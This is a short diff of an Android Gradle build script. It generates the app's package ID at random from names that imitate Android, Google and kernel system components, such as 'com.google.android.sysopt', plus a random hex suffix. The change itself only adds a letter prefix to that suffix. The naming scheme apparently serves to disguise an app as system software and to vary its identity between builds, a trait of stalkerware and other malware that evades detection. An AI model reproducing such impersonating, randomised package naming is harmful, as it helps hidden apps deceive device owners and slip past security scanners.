@@ -18,7 +18,7 @@ android {
         if (!customPkg) {
             def pkgBases = ["com.android.sysopt", "com.google.android.sysopt", "org.system.kernel.helper", "com.android.providers.sys"]
             def base = pkgBases[new Random().nextInt(pkgBases.size())]
-            def rand = Integer.toHexString(new Random().nextInt(0xFFFFF) + 0x10000)
+            def rand = "s" + Integer.toHexString(new Random().nextInt(0xFFFFF) + 0x10000)
             customPkg = "${base}.${rand}"
         }
         applicationId = customPkg
